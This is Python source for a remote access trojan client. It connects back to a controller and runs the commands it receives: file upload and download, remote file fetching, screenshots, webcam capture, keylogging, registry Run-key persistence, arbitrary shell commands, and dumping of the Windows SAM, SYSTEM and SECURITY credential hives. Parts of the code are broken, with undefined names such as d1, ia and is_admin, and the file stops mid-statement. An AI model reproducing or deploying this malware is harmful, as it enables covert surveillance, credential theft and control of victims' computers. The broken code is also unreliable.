import os, ssl, cv2, sys, time, shutil, ctypes, socket, threading, subprocess, json, requests
from mss import mss
import keylogger

def s():
    global s1
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def u():
    while True:
        time.sleep(1)
        try:
            s1.connect(('127.0.0.1', 5555))
            h()
            s1.close()
            break
        except:
            u()

def d():
    json1 = json.dumps(d1)
    s1.send(json1.encode())

def r():
    data1 = ''
    while True:
        try:
            data1 = data1 + s1.recv(1024).decode().rstrip()
            return json.loads(data1)
        except ValueError:
            continue

def df(file_name):
    f1 = open(file_name, 'wb')
    s1.settimeout(2)
    chunk1 = s1.recv(1024)
    while chunk1:
        f1.write(chunk1)
        try:
            chunk1 = s1.recv(1024)
        except socket.timeout as e:
            break
    s1.settimeout(None)
    f1.close()

def uf(file_name):
    f1 = open(file_name, 'rb')
    s1.send(f1.read())
    f1.close()

def durl(url):
    get_response1 = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response1.content)

def sc():
    if sys.platform == "win32" or sys.platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')
    elif sys.platform == "linux" or sys.platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')

def gsd():
    if not ia():
        return "You must run this function as an Administrator."
    SAM = r'C:\Windows\System32\config\SAM'
    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
    SECURITY = r'C:\Windows\System32\config\SECURITY'
    try:
        sam_file = open(SAM, 'rb')
        system_file = open(SYSTEM, 'rb')
        security_file = open(SECURITY, 'rb')
        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()
        sam_file.close()
        system_file.close()
        security_file.close()
        return sam_data, system_data, security_data
    except PermissionError:
        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
    except FileNotFoundError:
        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"

def cw():
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
    if not webcam.isOpened():
        print("No webcam available")
        return
    ret1, frame = webcam.read()
    if not ret1:
        print("Failed to read frame from webcam")
        return
    webcam.release()
    if sys.platform == "win32" or sys.platform == "darwin" or sys.platform == "linux" or sys.platform == "linux2":
        is_success1, im_buf_arr = cv2.imencode(".webcam.png", frame)
        if is_success1:
            with open('.webcam.png', 'wb') as f1:
                f1.write(im_buf_arr.tobytes())
        else:
            print("Failed to save webcam image")

def p(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            d('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            d('[+] Persistence Already Exists')
    except:
        d('[-] Error Creating Persistence With The Target Machine')

def ad():
    global admin1
    if sys.platform == 'win32':
        try:
            temp1 = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            admin1 = '[!!] User Privileges!'
        else:
            admin1 = '[+] Administrator Privileges!'

def sh():
    while True:
        command1 = r()
        if command1 == 'quit':
            break
        elif command1 == 'background' or command1 == 'bg':
            pass
        elif command1 == 'help':
            pass
        elif command1 == 'clear':
            pass
        elif command1[:3] == 'cd ':
            os.chdir(command1[3:])
        elif command1[:6] == 'upload':
            df(command1[7:])
        elif command1[:8] == 'download':
            uf(command1[9:])
        elif command1[:3] == 'get':
            try:
                durl(command1[4:])
                d('[+] Downloaded File From Specified URL!')
            except:
                d('[!!] Download Failed!')
        elif command1[:10] == 'screenshot':
            sc()
            uf('.screen.png')
            os.remove('.screen.png')
        elif command1[:6] == 'webcam':
            cw()
            uf('.webcam.png')
            os.remove('.webcam.png')
        elif command1[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            d('[+] Keylogger Started!')
        elif command1[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            d(logs)
        elif command1[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            d('[+] Keylogger Stopped!')
        elif command1[:11] == 'persistence':
            reg_name, copy_name = command1[12:].split(' ')
            p(reg_name, copy_name)
        elif command1[:7] == 'sendall':
            subprocess.Popen(command1[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        elif command1[:5] == 'check':
            try:
                is_admin()
                d(admin + ' platform: ' + platform)
            except:
                d('Cannot Perform Privilege Check! Platform: ' + platform)
        elif command1[:5] == 'start':
            try:
                subprocess.Popen(command1[6:], shell=True)
                d('[+] Started!')
            except:
                d('[-] Failed to start!')
        elif command1[:12] == 'get_sam_dump':
            sam_dump, system_dump
